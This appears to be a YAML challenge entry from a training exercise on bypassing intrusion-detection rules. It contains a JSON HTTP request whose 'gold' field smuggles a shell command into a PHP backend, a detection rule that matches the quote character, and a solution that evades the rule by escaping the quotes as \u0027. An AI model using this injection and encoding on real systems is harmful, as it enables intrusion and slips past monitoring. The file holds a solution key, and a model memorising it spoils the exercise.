name: 'Shell Injection (JSON) 4'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Print /app/valuate-hoard**

hints: []

target: hoard

base_request: |-
  POST /backend.php HTTP/1.1
  Host: localhost
  Content-Type: application/json
  Content-Length: 98

  {
    "hoardType": "artifact",
    "gold": "10';cat /app/valuate-hoard; echo '",
    "gems": "20",
    "artifacts": "30"
  }

solution: |-
  POST /backend.php HTTP/1.1
  Host: localhost
  Content-Type: application/json
  Content-Length: 98

  {
    "hoardType": "artifact",
    "gold": "10\u0027;cat /app/valuate-hoard; echo \u0027",
    "gems": "20",
    "artifacts": "30"
  }

solution_note: Using \u00XX encoding

rules:
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "\"artifact\""; content: "'"; sid:123456; rev:1;)

expected_output: "Perform some math"
